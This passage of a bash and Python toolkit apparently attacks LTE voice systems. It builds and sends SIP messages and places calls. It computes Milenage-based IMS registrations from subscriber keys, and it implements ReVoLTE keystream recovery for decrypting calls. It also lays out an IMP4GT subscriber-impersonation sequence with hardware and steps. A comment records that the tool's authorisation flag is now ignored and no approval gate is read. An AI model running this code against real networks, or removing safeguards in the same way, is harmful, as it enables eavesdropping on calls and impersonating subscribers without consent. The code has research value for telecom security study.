        # Every message needs a branch, a CSeq and the digest fields even when
        # the dialog does not use them, so start from the same defaults the
        # single-message builder uses and let the dialog override what it owns.
        d = _sip_defaults('invite', dict(base))
        d.update(over)
        return render_sip(kind, d)

    def wire(msg, label):
        try:
            sock.sendto(msg, addr)
        except OSError as exc:
            print('ERROR\tsend to %s:%d failed: %s' % (host, portn, exc),
                  file=sys.stderr)
            raise
        print('sent\t%s\t%d' % (label, len(msg)))

    def await_final():
        # Provisional responses are real: 100 and 180 arrive before the answer
        # and must not be mistaken for it.
        while True:
            try:
                data, _peer = sock.recvfrom(65535)
            except socket.timeout:
                return None
            except OSError:
                return None
            line, hdrs, body = _sip_head(data)
            print('recv\t%s' % line)
            parts = line.split(' ')
            try:
                code = int(parts[1])
            except (IndexError, ValueError):
                continue
            if code >= 200:
                return line, code, hdrs, body

    def authenticate(line, code, hdrs, method, ruri, **extra):
        """Answer a 401/407 and return the request that carries the answer."""
        if auth_mode == 'none':
            print('challenged\t%s' % line)
            return None
        hdr = (hdrs.get('www-authenticate') or hdrs.get('proxy-authenticate')
               or [''])[0]
        scheme, params = _digest_challenge(hdr)
        nonce = params.get('nonce', '')
        realm = params.get('realm', base['realm'])
        qop = _qop_chosen(params)
        if qop == 'auth-int':
            print('ERROR\tauth-int needs a body hash this verb does not compute',
                  file=sys.stderr)
            return None
        if auth_mode == 'aka':
            if not res_hex:
                print('ERROR\tauth=aka needs res=<hex>', file=sys.stderr)
                return None
            pw = (bytes.fromhex(res_hex) if enc == 'raw'
                  else res_hex.lower().encode())
        else:
            pw = secret.encode()
        nc = '00000001'
        cnonce = _rand(4)
        uri = 'sip:%s' % ruri
        response = digest_response(base['user'], realm, pw, method, uri,
                                   nonce, nc, cnonce, qop)
        print('auth\t%s\trealm=%s\tqop=%s' % (scheme or 'digest', realm, qop or 'none'))
        state['cseq'] += 1
        over = dict(branch='z9hG4bK' + _rand(6), cseq=str(state['cseq']),
                    realm=realm, nonce=nonce, uri=uri, response=response,
                    qop=qop, nc=nc, cnonce=cnonce, user=base['user'],
                    algorithm=params.get('algorithm', 'AKAv1-MD5'))
        over.update(extra)
        return build(method.lower() + '-auth', **over)

    try:
        invite_extra = {}
        if media is not None:
            invite_extra['rtp_port'] = str(media.port)
        wire(build('invite', cseq=str(state['cseq']),
                   branch='z9hG4bK' + _rand(6), **invite_extra), 'INVITE')
        resp = await_final()
        if resp is None:
            print('status\tno-answer')
            return 3
        line, code, hdrs, body = resp
        if code in (401, 407):
            msg = authenticate(line, code, hdrs, 'INVITE', base['ruri'],
                               **invite_extra)
            if msg is None:
                print('status\tchallenged-no-credentials')
                return 3
            wire(msg, 'INVITE(auth)')
            resp = await_final()
            if resp is None:
                print('status\tno-answer-after-auth')
                return 3
            line, code, hdrs, body = resp
        if code != 200:
            # ACK for a non-2xx is the same transaction and a different form;
            # this verb does not send it and says so rather than faking it.
            print('status\tfailed-%d' % code)
            # A status code from a handset is an answer about the handset. Say
            # what each one means for this leg, so nobody spends an evening on
            # the wrong end of the problem.
            hints = {
                403: 'the endpoint answered and refused this caller: a client '
                     'that only accepts calls from its registered server, or a '
                     'phone that blocked the identity',
                404: 'the endpoint answered and does not know that address: the '
                     'user part of the INVITE does not match a configured account',
                405: 'the endpoint answered and does not accept INVITE there '
                     '(OPTIONS is answered, calls are not)',
                406: 'the endpoint answered and no offered codec was acceptable',
                408: 'the endpoint answered and timed out its own side',
                480: 'the callee is registered but currently unreachable',
                486: 'the callee is busy',
                488: 'the endpoint answered and rejected the SDP: codec or media '
                     'address it will not accept',
                491: 'the endpoint already has a call with this Call-ID in '
                     'progress',
                503: 'the endpoint answered and is out of service or refusing '
                     'this request class',
                603: 'the callee declined the call',
            }
            if code in hints:
                print('why\t%s' % hints[code])
            print('note\tno ACK was sent: a non-2xx ACK belongs to the failed '
                  'transaction and is a different message')
            return 4
        to_tag = ''
        m = re.search(r';tag=([^;>\s]+)', (hdrs.get('to') or [''])[0])
        if m:
            to_tag = m.group(1)
        ruri = base['ruri']
        contact = (hdrs.get('contact') or [''])[0]
        m = re.search(r'sip:([^>]+)', contact)
        if m:
            ruri = m.group(1)
        print('dialog\tcallid=%s\tfrom_tag=%s\tto_tag=%s\truri=%s'
              % (base['callid'], base['from_tag'], to_tag or '(none)', ruri))
        wire(build('ack', ruri=ruri, to_tag=to_tag, cseq=str(state['cseq']),
                   branch='z9hG4bK' + _rand(6)), 'ACK')

        # ── the media leg, now that the answer named where audio goes ────
        if media is not None:
            answer = sdp_parse(body)
            pt, picked = sdp_choose_codec(answer, media_codec)
            print('sdp_answer\tport=%d\tconn=%s\tpt=%s'
                  % (answer['port'], answer['conn'] or '-',
                     ' '.join(answer['pts']) or '-'))
            if not answer['port']:
                print('media\tno-media-in-answer\tstatus=signalling-only')
            elif pt is None:
                print('media\tcodec-unsupported\t%s\tstatus=signalling-only\t'
                      'why=the answer picked a payload type this leg cannot '
                      'decode' % picked)
            else:
                remote_ip = answer['conn'] or host
                # The answer's connection address is what the far end wants to
                # receive on; 0.0.0.0 means "use the address the INVITE came
                # from", which for us is the SIP peer.
                if remote_ip in ('0.0.0.0', ''):
                    remote_ip = host
                media.attach(remote_ip, answer['port'], pt)
                print('media\tstart\tremote=%s:%d\tpt=%d\tcodec=%s'
                      % (remote_ip, answer['port'], pt, media.rtpmap_name))
                media.start()
                media.run(talk_seconds)
                for k, v in media.stats():
                    print('%s\t%s' % (k, v))
                print('media\tstop')

        if opt.get('bye', '1') == '0':
            print('status\tcall-up')
            return 0
        state['cseq'] += 1
        wire(build('bye', ruri=ruri, to_tag=to_tag, cseq=str(state['cseq']),
                   branch='z9hG4bK' + _rand(6)), 'BYE')
        resp = await_final()
        if resp is None:
            print('status\tbye-no-answer')
            return 3
        if resp[1] == 200:
            print('status\tcall-torn-down')
            return 0
        print('status\tbye-failed-%d' % resp[1])
        return 4
    finally:
        sock.close()
        if media is not None:
            media.shutdown()


def cmd_akadigest(argv):
    """AKAv1-MD5 (RFC 3310 3.3): RES is the password of RFC 2617 digest.

    The RFC says which value is the password and does not say how it is
    encoded, and real cores differ: some hash the RES's hexadecimal text,
    some hash its 16 bytes. Both are computed and labelled, because a
    response computed under the wrong one is a valid-looking digest that the
    core will reject.
    """
    if len(argv) < 5:
        raise SystemExit('ERROR\tusage: akadigest <res-hex> <user> <realm> '
                         '<method> <uri> [nonce] [nc] [cnonce] [qop]')
    res_hex, user, realm, method, uri = argv[:5]
    nonce = argv[5] if len(argv) > 5 else ''
    nc = argv[6] if len(argv) > 6 else ''
    cnonce = argv[7] if len(argv) > 7 else ''
    qop = argv[8] if len(argv) > 8 else ''
    rand_hex = argv[9] if len(argv) > 9 else ''
    try:
        raw = bytes.fromhex(res_hex)
    except ValueError:
        print('ERROR\tRES is not hex: %r' % res_hex, file=sys.stderr)
        return 2
    ha2 = hashlib.md5(('%s:%s' % (method, uri)).encode()).hexdigest()

    def response_for(password):
        ha1 = hashlib.md5(('%s:%s:' % (user, realm)).encode()
                          + password).hexdigest()
        if qop:
            return hashlib.md5(('%s:%s:%s:%s:%s:%s'
                                % (ha1, nonce, nc, cnonce, qop, ha2)).encode()).hexdigest()
        return hashlib.md5(('%s:%s:%s' % (ha1, nonce, ha2)).encode()).hexdigest()

    # RFC 3310 3.2: the nonce is base64(RAND || AUTN || server data). If the
    # caller tells us which RAND the challenge should carry, check it: a
    # response computed over somebody else's challenge is silently wrong.
    if rand_hex:
        try:
            blob = base64.b64decode(nonce + '=' * (-len(nonce) % 4))
        except Exception:
            blob = b''
        try:
            want = bytes.fromhex(rand_hex)
        except ValueError:
            want = b''
        if len(blob) < 16 or len(want) != 16:
            verdict = 'unknown'
        elif blob[:16] == want:
            verdict = 'yes'
        else:
            verdict = 'no'
        print('nonce_rand\t%s' % verdict)

    print('res\t%s' % res_hex.lower())
    print('ha2\t%s' % ha2)
    print('response_hex\t%s' % response_for(res_hex.lower().encode()))
    print('response_raw\t%s' % response_for(raw))
    return 0


def main():
    argv = sys.argv[1:]
    if not argv:
        raise SystemExit('usage: vims_py <ctr|revolte|ksr|reuse|mkfixture|sip|msgs|digest> ...')
    mode = argv[0]; rest = argv[1:]
    if mode == 'ctr':
        return cmd_ctr(rest)
    if mode == 'revolte':
        return cmd_revolte(rest)
    if mode == 'ksr':
        return cmd_ksr(rest)
    if mode == 'reuse':
        return cmd_reuse(rest)
    if mode == 'mkfixture':
        return cmd_mkfixture(rest)
    if mode == 'sip':
        return cmd_sip(rest)
    if mode == 'msgs':
        return cmd_msgs(rest)
    if mode == 'digest':
        return cmd_digest(rest)
    if mode == 'sipbuild':
        return cmd_sipbuild(rest)
    if mode == 'sipsend':
        return cmd_sipsend(rest)
    if mode == 'akadigest':
        return cmd_akadigest(rest)
    if mode == 'callflow':
        return cmd_callflow(rest)
    if mode == 'g711':
        return cmd_g711(rest)
    if mode == 'sipprobe':
        return cmd_sipprobe(rest)
    raise SystemExit('unknown mode ' + mode)


rc = main()
sys.exit(rc if isinstance(rc, int) else 0)
PY
}

# ── ReVoLTE demo ────────────────────────────────────────────────────────
# Two plaintexts, one keystream. This is the whole ReVoLTE primitive: the
# keystream cancels in the XOR of the two ciphertexts, and a known plaintext
# recovers the keystream, which decrypts the other call. The demo keystream is
# the published NIST SP 800-38A F.5.1 CTR-AES128 stream so the value is a
# known answer, not a value this module invented.
vims_cmd_revolte_demo() {
    local p1="${1:-}" p2="${2:-}"
    [[ -n "$p1" && -n "$p2" ]] || {
        printf 'ERROR\tusage: --revolte-demo <plaintext1-hex> <plaintext2-hex>\n' >&2; return 2; }
    vims_is_hex "$p1" || { printf 'ERROR\tplaintext1 is not hex\n' >&2; return 2; }
    vims_is_hex "$p2" || { printf 'ERROR\tplaintext2 is not hex\n' >&2; return 2; }
    printf 'paper\t%s\n' "Call Me Maybe: Eavesdropping Encrypted LTE Calls With ReVoLTE (Rupprecht, Kohls, Holz, Popper), USENIX Security 2020"
    printf 'precondition\t%s\n' "the same keystream must be applied twice: same radio resources (RLC/MAC allocation) and same bearer/COUNT; the network's allocation decides it, so the attacker sniffs the setup call and waits for a reuse"
    vims_py revolte "$p1" "$p2"
}

vims_cmd_keystream_recover() {
    local ct="${1:-}" kp="${2:-}" second="${3:-}"
    [[ -n "$ct" && -n "$kp" ]] || {
        printf 'ERROR\tusage: --keystream-recover <ciphertext-hex> <known-plaintext-hex> [second-ciphertext-hex]\n' >&2; return 2; }
    vims_is_hex "$ct" || { printf 'ERROR\tciphertext is not hex\n' >&2; return 2; }
    vims_is_hex "$kp" || { printf 'ERROR\tknown plaintext is not hex\n' >&2; return 2; }
    if [[ -n "$second" ]]; then
        vims_is_hex "$second" || { printf 'ERROR\tsecond ciphertext is not hex\n' >&2; return 2; }
        vims_py ksr "$ct" "$kp" "$second"
    else
        vims_py ksr "$ct" "$kp"
    fi
}

vims_cmd_detect_reuse() {
    local pcap="" port="0" calls="" tag="0"
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --calls) calls="${2:-}"; shift 2 || shift ;;
            --tag)   tag="${2:-0}";  shift 2 || shift ;;
            *)
                if [[ -z "$pcap" ]]; then pcap="$1"
                elif [[ "$port" == "0" ]]; then port="$1"
                else printf 'ERROR\ttoo many arguments\n' >&2; return 2
                fi
                shift ;;
        esac
    done
    [[ -n "$pcap" ]] || {
        printf 'ERROR\tusage: --detect-keystream-reuse <pcap> [udp-port] [--calls <tsv>] [--tag <octets>]\n' >&2
        printf 'WHY\treuse is a claim about two calls, so the caller must say which capture and may say which calls\n' >&2
        return 2; }
    [[ -f "$pcap" ]] || { printf 'ERROR\tno such capture: %s\n' "$pcap" >&2; return 1; }
    [[ "$port" =~ ^[0-9]+$ ]] || { printf 'ERROR\tport must be numeric\n' >&2; return 2; }
    [[ "$tag" =~ ^[0-9]+$ ]] || { printf 'ERROR\ttag length must be numeric\n' >&2; return 2; }
    if [[ -n "$calls" ]]; then
        [[ -f "$calls" ]] || { printf 'ERROR\tno such calls table: %s\n' "$calls" >&2; return 1; }
    fi
    printf 'model\t%s\n' "ReVoLTE keystream-reuse detector (Rupprecht et al., USENIX Security 2020)"
    vims_py reuse "$pcap" "$port" "$calls" "$tag"
}

# ── SIP construction and transmission ───────────────────────────────────
# The builder is strict; the parser above is lenient. That asymmetry is the
# point: a capture is whatever the network sent, but a message we put on the
# wire must be exactly what RFC 3261 asks for or we are testing the parser we
# wrote instead of the network we are talking to.
vims_sip_build() {
    local kind="${1:-}"
    [[ -n "$kind" ]] || {
        printf 'ERROR\tusage: --sip-build <register|register-auth|challenge|invite> [key=value ...]\n' >&2
        return 2; }
    shift || true
    vims_py sipbuild "$kind" "$@"
}

# ── sending it ──────────────────────────────────────────────────────────
# Building a REGISTER and never sending it tests nothing but our own builder.
# This puts the bytes in a datagram addressed by the operator. No approval flag
# is read: the destination is the operator's business, and the old
# --i-have-a-lab-and-authorisation is accepted and ignored so scripts keep
# working.
vims_sip_send() {
    local dst="${1:-}" kind="${2:-}"
    if [[ -z "$dst" || -z "$kind" ]]; then
        printf 'ERROR\tusage: --sip-send <host>[:port] <kind> [key=value ...]\n' >&2
        printf 'WHY\tsending SIP is a wire action: it needs a destination and a message kind\n' >&2
        return 2
    fi
    local host port
    if [[ "$dst" == \[*\]:* ]]; then
        host="${dst#[*}"; host="${host%%\]*}"; port="${dst##*:}"
    elif [[ "$dst" == *:* ]]; then
        host="${dst%:*}"; port="${dst##*:}"
    else
        host="$dst"; port="${VIMS_SIP_PORT:-5060}"
    fi
    [[ "$host" =~ ^[A-Za-z0-9_.:-]+$ ]] || {
        printf 'ERROR\thost %q is not a hostname or address\n' "$host" >&2; return 2; }
    [[ "$port" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tport %q is not a number\n' "$port" >&2; return 2; }
    shift 2 || true
    printf 'transport\tudp\n'
    printf 'gate\tnone\n'
    vims_py sipsend "$host" "$port" "$kind" "$@"
}

# ── the REGISTER a core will accept ─────────────────────────────────────
# A REGISTER whose response is a placeholder is a message, not an
# authentication. This runs Milenage (tools/gsm_crypto.py, checked against the
# 3GPP TS 35.208 vectors) for RES, then hashes it into the RFC 2617 digest the
# way RFC 3310 3.3 says to. The message is the only thing on stdout, so it can
# be piped straight into a socket; everything describing it goes to stderr.
vims_register_aka() {
    local k="" op="" opc="" rand="" sqn="" amf="" impi="" realm="" nonce="" uri=""
    local nc="00000001" cnonce="" enc="hex" contact="" host=""
    local a
    for a in "$@"; do
        case "$a" in
            k=*)        k="${a#k=}" ;;
            opc=*)      opc="${a#opc=}" ;;
            op=*)       op="${a#op=}" ;;
            rand=*)     rand="${a#rand=}" ;;
            sqn=*)      sqn="${a#sqn=}" ;;
            amf=*)      amf="${a#amf=}" ;;
            impi=*)     impi="${a#impi=}" ;;
            realm=*)    realm="${a#realm=}" ;;
            nonce=*)    nonce="${a#nonce=}" ;;
            uri=*)      uri="${a#uri=}" ;;
            nc=*)       nc="${a#nc=}" ;;
            cnonce=*)   cnonce="${a#cnonce=}" ;;
            encoding=*) enc="${a#encoding=}" ;;
            contact=*)  contact="${a#contact=}" ;;
            host=*)     host="${a#host=}" ;;
            *) printf 'ERROR\targument %q is not key=value\n' "$a" >&2; return 2 ;;
        esac
    done
    if [[ -z "$k" || -z "$rand" || ( -z "$op" && -z "$opc" ) ]]; then
        printf 'ERROR\tusage: --register-aka k=<32hex> (op=<32hex>|opc=<32hex>) rand=<32hex> nonce=<b64> [impi=] [realm=] [uri=] [nc=] [cnonce=] [sqn=] [amf=] [encoding=hex|raw]\n' >&2
        printf 'WHY\tthe response is f2(K, RAND) hashed into an RFC 2617 digest; without K and RAND there is nothing to compute and the message would carry a placeholder\n' >&2
        return 2
    fi
    if [[ -z "$nonce" ]]; then
        printf 'ERROR\t--register-aka needs nonce=<the WWW-Authenticate nonce from the 401>\n' >&2
        printf 'WHY\tthe digest is computed over the challenge nonce; inventing one yields a response that is wrong for the challenge the core issued\n' >&2
        return 2
    fi
    case "$enc" in
        hex|raw) ;;
        *) printf 'ERROR\tencoding must be hex or raw (got %q)\n' "$enc" >&2; return 2 ;;
    esac
    local gsm="$IMSISTING_ROOT/tools/gsm_crypto.py"
    if [[ ! -f "$gsm" ]]; then
        printf 'ERROR\tmissing %s: it is the Milenage implementation\n' "$gsm" >&2
        return 1
    fi
    local -a margs=(--milenage --ki "$k" --rand "$rand")
    [[ -n "$op" ]]  && margs+=(--op "$op")
    [[ -n "$opc" ]] && margs+=(--opc "$opc")
    [[ -n "$sqn" ]] && margs+=(--sqn "$sqn")
    [[ -n "$amf" ]] && margs+=(--amf "$amf")
    local gout grc res
    gout=$(python3 "$gsm" "${margs[@]}" 2>&1); grc=$?
    if (( grc != 0 )); then
        printf 'ERROR\tMilenage failed: %s\n' \
            "$(printf '%s' "$gout" | head -2 | tr '\n' ' ')" >&2
        return 1
    fi
    res=$(printf '%s\n' "$gout" | awk -F'\t' '$1=="f2"{print tolower($2); exit}')
    if [[ -z "$res" ]]; then
        printf 'ERROR\tMilenage produced no f2 (RES)\n' >&2
        return 1
    fi
    : "${impi:=310150123456789@ims.mnc001.mcc310.3gppnetwork.org}"
    : "${realm:=ims.mnc001.mcc310.3gppnetwork.org}"
    : "${uri:=sip:$realm}"
    : "${cnonce:=$(printf '%08x' "$(( RANDOM * 32768 + RANDOM ))")}"
    local dg response noncechk opcout
    dg=$(vims_py akadigest "$res" "${impi%%@*}" "$realm" REGISTER "$uri" \
             "$nonce" "$nc" "$cnonce" auth "$rand") || return 1
    response=$(printf '%s\n' "$dg" | awk -F'\t' -v k="response_$enc" '$1==k{print $2; exit}')
    noncechk=$(printf '%s\n' "$dg" | awk -F'\t' '$1=="nonce_rand"{print $2; exit}')
    opcout=$(printf '%s\n' "$gout" | awk -F'\t' '$1=="opc"{print $2; exit}')
    [[ -n "$response" ]] || { printf 'ERROR\tcould not compute the digest\n' >&2; return 1; }
    {
        printf 'milenage_opc\t%s\n' "$opcout"
        printf 'res\t%s\n' "$res"
        printf 'encoding\t%s\n' "$enc"
        printf 'response_hex\t%s\n' \
            "$(printf '%s\n' "$dg" | awk -F'\t' '$1=="response_hex"{print $2; exit}')"
        printf 'response_raw\t%s\n' \
            "$(printf '%s\n' "$dg" | awk -F'\t' '$1=="response_raw"{print $2; exit}')"
        printf 'nonce_carries_rand\t%s\n' "${noncechk:-unknown}"
        if [[ "$noncechk" == "no" ]]; then
            printf 'WARNING\tthe nonce does not decode to that RAND: the response will not match the challenge\n'
        fi
        printf 'chosen\tthe %s encoding, because RFC 3310 names RES as the password without fixing its byte form\n' "$enc"
    } >&2
    local -a sargs=("impi=$impi" "realm=$realm" "nonce=$nonce" "uri=$uri"
                    "response=$response" "nc=$nc" "cnonce=$cnonce"
                    "algorithm=AKAv1-MD5" "qop=auth")
    [[ -n "$contact" ]] && sargs+=("contact=$contact")
    [[ -n "$host" ]]    && sargs+=("host=$host")
    vims_py sipbuild register-auth "${sargs[@]}"
}

# ── placing a call ──────────────────────────────────────────────────────
# A REGISTER is one transaction; a call is a dialog that has to keep its own
# state. The bytes are built by vims_py callflow, which owns that state; this
# wrapper splits the target and turns K/OP/RAND into the RES the AKAv1 answer
# needs -- because the
# response depends on RES and not on the nonce, so it can be computed before
# the challenge arrives.
vims_call_flow() {
    local target="${1:-}"
    if [[ -z "$target" ]]; then
        printf 'ERROR\tusage: --call <host>[:port] [key=value ...]\n' >&2
        return 2
    fi
    shift
    local host="$target" port="5060"
    if [[ "$target" == *:* ]]; then
        host="${target%%:*}"
        port="${target##*:}"
    fi
    if [[ ! "$port" =~ ^[0-9]+$ ]] || (( port < 1 || port > 65535 )); then
        printf 'ERROR\tport %q is outside 1..65535\n' "$port" >&2
        return 2
    fi
    local k="" op="" opc="" rand="" had_res=""
    local -a args=()
    local a media="none" codec="PCMU" play="0" record="" duration="0" rtpport="0"
    # The media leg is spelled as flags here and as key=value in the engine, so
    # both `--media mic --play --duration 30` and `media=mic play=1 duration=30`
    # reach the same code. Flags are read off and never forwarded verbatim.
    while (( $# )); do
        case "$1" in
            --media)     media="${2:-none}"; shift 2; continue ;;
            --media=*)   media="${1#--media=}"; shift; continue ;;
            --codec)     codec="${2:-PCMU}"; shift 2; continue ;;
            --codec=*)   codec="${1#--codec=}"; shift; continue ;;
            --play)      play="1"; shift; continue ;;
            --record-wav)   record="${2:-}"; shift 2; continue ;;
            --record-wav=*) record="${1#--record-wav=}"; shift; continue ;;
            --duration)  duration="${2:-0}"; shift 2; continue ;;
            --duration=*) duration="${1#--duration=}"; shift; continue ;;
            --rtp-port)  rtpport="${2:-0}"; shift 2; continue ;;
            --rtp-port=*) rtpport="${1#--rtp-port=}"; shift; continue ;;
        esac
        a="$1"; shift
        case "$a" in
            k=*)    k="${a#k=}" ;;
            opc=*)  opc="${a#opc=}" ;;
            op=*)   op="${a#op=}" ;;
            rand=*) rand="${a#rand=}" ;;
            res=*)  had_res="${a#res=}"; args+=("$a") ;;
            *)      args+=("$a") ;;
        esac
    done
    # Defaults go FIRST so an explicit key=value on the command line wins: the
    # engine reads the last value for a key, and a flag the operator wrote must
    # not be overridden by a default this wrapper supplied.
    local -a mdefaults=("media=$media" "codec=$codec" "play=$play"
                        "rtp_port=$rtpport" "duration=$duration")
    [[ -n "$record" ]] && mdefaults+=("record=$record")
    args=("${mdefaults[@]}" "${args[@]}")
    if [[ -n "$k" && -n "$rand" && -n "${op}${opc}" && -z "$had_res" ]]; then
        local gsm="$IMSISTING_ROOT/tools/gsm_crypto.py" gout res
        if [[ ! -f "$gsm" ]]; then
            printf 'ERROR\tmissing %s: it is the Milenage implementation\n' "$gsm" >&2
            return 1
        fi
        local -a margs=(--milenage --ki "$k" --rand "$rand")
        [[ -n "$op" ]]  && margs+=(--op "$op")
        [[ -n "$opc" ]] && margs+=(--opc "$opc")
        gout=$(python3 "$gsm" "${margs[@]}" 2>&1) || {
            printf 'ERROR\tMilenage failed: %s\n' "$(printf '%s' "$gout" | head -1)" >&2
            return 1
        }
        res=$(printf '%s\n' "$gout" | awk -F'\t' '$1=="f2"{print tolower($2); exit}')
        [[ -n "$res" ]] || { printf 'ERROR\tMilenage produced no RES\n' >&2; return 1; }
        printf 'res\t%s\n' "$res" >&2
        args+=("res=$res")
    fi
    local out rc
    out=$(vims_py callflow "$host" "$port" "${args[@]}"); rc=$?
    printf '%s\n' "$out"
    # A call's media numbers are evidence: keep the last set so --rtp-stats can
    # report what this call measured rather than what we hoped it would.
    if printf '%s\n' "$out" | grep -q '^rtp_'; then
        mkdir -p "$STATE_DIR/volte" 2>/dev/null
        # Only the measurements: one key per row, and `status` belongs to the
        # verb that reports them, not to the file it reads.
        printf '%s\n' "$out" | grep -E '^rtp_' >| "$STATE_DIR/volte/rtp_last.tsv"
    fi
    return "$rc"
}

# ── the media numbers of the last call ──────────────────────────────────
vims_cmd_rtp_stats() {
    local f="$STATE_DIR/volte/rtp_last.tsv"
    if [[ ! -s "$f" ]]; then
        printf 'status\tnone\n'
        printf 'ERROR\tno media has been measured yet\n' >&2
        printf 'WHY\trun --call <host> --media mic --play --duration 20 first; this\n' >&2
        printf 'WHY\tverb reports the last call, it does not probe anything\n' >&2
        return 1
    fi
    printf 'status\treported\n'
    printf 'file\t%s\n' "$f"
    cat "$f"
}

# ── is the far end even there? ──────────────────────────────────────────
# A phone that rings nothing is usually a phone with no SIP client listening.
# OPTIONS is the method RFC 3261 11.1 defines for asking, and it changes
# nothing, so it is the right first question to ask of a handset.
vims_cmd_sip_probe() {
    local dst="${1:-}"
    if [[ -z "$dst" ]]; then
        printf 'ERROR\tusage: --sip-probe <host>[:port] [user=...] [to=...]\n' >&2
        return 2
    fi
    local host port
    if [[ "$dst" == *:* ]]; then host="${dst%:*}"; port="${dst##*:}"
    else host="$dst"; port="${VIMS_SIP_PORT:-5060}"; fi
    [[ "$host" =~ ^[A-Za-z0-9_.:-]+$ ]] || {
        printf 'ERROR\thost %q is not a hostname or address\n' "$host" >&2; return 2; }
    [[ "$port" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tport %q is not a number\n' "$port" >&2; return 2; }
    shift
    vims_py sipprobe "$host" "$port" "$@"
}

# ── G.711 in and out, so the tables can be checked without a call ───────
vims_cmd_g711() {
    local codec="${1:-}" direction="${2:-}" hex="${3:-}"
    [[ -n "$codec" && -n "$direction" ]] || {
        printf 'ERROR\tusage: --g711 <PCMU|PCMA> encode|decode <hex>\n' >&2
        return 2; }
    vims_py g711 "$codec" "$direction" "$hex"
}

# ── IMP4GT model ────────────────────────────────────────────────────────
vims_imp4gt_model() {
    cat <<'EOF'
paper	IMP4GT: IMPersonation Attacks in 4G NeTworks (Rupprecht, Kohls, Holz, Popper), NDSS 2020
model	layer-2 identity mapping impersonation
status	handoff
precondition	layer-2 position: the attacker must be able to transmit and receive LTE PHY/MAC frames on the victim's cell with the victim's RNTI and the victim's uplink timing advance
precondition	the mutual authentication is anchored in the NAS/EMM layer, while the lower layers route by RNTI; the RNTI is not cryptographically bound to the authenticated subscriber at layer 2
precondition	a known RNTI and the user-plane ciphering keys are not needed for the impersonation half the paper demonstrates: the network accepts uplink user-plane data addressed with the victim's RNTI
hardware	USRP B210 or LimeSDR with a stable clock (GPSDO recommended), srsRAN or a modified srsUE, and an isolated or licensed test cell
sequence	1. camp on the victim's cell and recover the victim's C-RNTI from the downlink control channel
sequence	2. synchronise to the uplink and acquire the victim's timing advance so uplink bursts land in the grant
sequence	3. uplink impersonation: transmit user-plane data with the victim's RNTI in the victim's uplink grant; the network attributes it to the victim
sequence	4. replace or race the victim's uplink data (for example a DNS query), which is the aLTEr-style payload the paper builds on
sequence	5. downlink impersonation: with a layer-2 position the attacker can also present downlink data to the victim as if from the eNB
sequence	6. the two directions together break the mutual-authentication assumption without breaking any cipher
detection	the operator sees a second transmitter on the victim's RNTI: duplicate uplink sequence numbers, timing-advance inconsistency, and RLC retransmissions the victim never sent
note	this verb builds the sequence and its preconditions. It does not transmit; the transmit half is the handoff named above.
EOF
    return 0
}

# ── SIP and IMS registration ────────────────────────────────────────────
vims_cmd_sip_parse() {
    local h="${1:-}"
    [[ -n "$h" ]] || { printf 'ERROR\tusage: --sip-parse <hex>\n' >&2; return 2; }
    vims_is_hex "$h" || { printf 'ERROR\tnot hex\n' >&2; return 2; }
    vims_py sip "$h"
}

# Field reader for key<TAB>value output.
vims_fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

vims_cmd_ims_registration() {
    local h="${1:-}" res="${2:-}"
    [[ -n "$h" ]] || { printf 'ERROR\tusage: --ims-registration <hex> [aka-res-hex]\n' >&2; return 2; }
    vims_is_hex "$h" || { printf 'ERROR\tnot hex\n' >&2; return 2; }
    local sip; sip=$(vims_py sip "$h") || return 1
    local type method status auth chal
    type=$(vims_fld "$sip" type); method=$(vims_fld "$sip" method)
    status=$(vims_fld "$sip" status_code)
    auth=$(vims_fld "$sip" authorization); chal=$(vims_fld "$sip" www_authenticate)

    local step
    if [[ "$type" == "request" && "$method" == "REGISTER" && "$auth" == "-" ]]; then
        step="1_register_initial"
    elif [[ "$type" == "response" && "$status" == "401" ]]; then
        step="2_challenge"
    elif [[ "$type" == "request" && "$method" == "REGISTER" && "$auth" != "-" ]]; then
        step="3_register_authenticated"
    elif [[ "$type" == "response" && "$status" == "200" ]]; then
        step="4_registered"
    else
        step="other"
    fi
    printf 'flow_step\t%s\n' "$step"
    printf 'from\t%s\n' "$(vims_sanitize "$(vims_fld "$sip" from)")"
    printf 'to\t%s\n' "$(vims_sanitize "$(vims_fld "$sip" to)")"
    printf 'contact\t%s\n' "$(vims_sanitize "$(vims_fld "$sip" contact)")"
    if [[ "$chal" != "-" ]]; then
        local realm nonce alg qop
        realm=$(printf '%s' "$chal" | sed -n 's/.*realm="\([^"]*\)".*/\1/p')
        nonce=$(printf '%s' "$chal" | sed -n 's/.*nonce="\([^"]*\)".*/\1/p')
        alg=$(printf '%s' "$chal" | sed -n 's/.*algorithm=\([A-Za-z0-9-]*\).*/\1/p')
        qop=$(printf '%s' "$chal" | sed -n 's/.*qop="\([^"]*\)".*/\1/p')
        printf 'challenge_realm\t%s\nchallenge_nonce\t%s\nchallenge_algorithm\t%s\nchallenge_qop\t%s\n' \
            "$(vims_sanitize "$realm")" "$(vims_sanitize "$nonce")" "$(vims_sanitize "$alg")" "$(vims_sanitize "${qop:--}")"
    fi
    if [[ "$auth" != "-" ]]; then
        local auser arealm anonce auri aresp anc acnonce aqop
        auser=$(printf '%s' "$auth" | sed -n 's/.*username="\([^"]*\)".*/\1/p')
        arealm=$(printf '%s' "$auth" | sed -n 's/.*realm="\([^"]*\)".*/\1/p')
        anonce=$(printf '%s' "$auth" | sed -n 's/.*[[:space:],]nonce="\([^"]*\)".*/\1/p')
        auri=$(printf '%s' "$auth" | sed -n 's/.*uri="\([^"]*\)".*/\1/p')
        aresp=$(printf '%s' "$auth" | sed -n 's/.*response="\([^"]*\)".*/\1/p')
        anc=$(printf '%s' "$auth" | sed -n 's/.*nc=\([0-9a-fA-F]*\).*/\1/p')
        acnonce=$(printf '%s' "$auth" | sed -n 's/.*cnonce="\([^"]*\)".*/\1/p')
        aqop=$(printf '%s' "$auth" | sed -n 's/.*qop=\([a-z]*\).*/\1/p')
        printf 'auth_username\t%s\nauth_realm\t%s\nauth_nonce\t%s\nauth_uri\t%s\nauth_response\t%s\n' \
            "$(vims_sanitize "$auser")" "$(vims_sanitize "$arealm")" "$(vims_sanitize "$anonce")" \
            "$(vims_sanitize "$auri")" "$(vims_sanitize "$aresp")"
        if [[ -n "$res" ]]; then
            vims_is_hex "$res" || { printf 'ERROR\tAKA RES is not hex\n' >&2; return 2; }
            printf 'aka_res_hex\t%s\n' "$res"
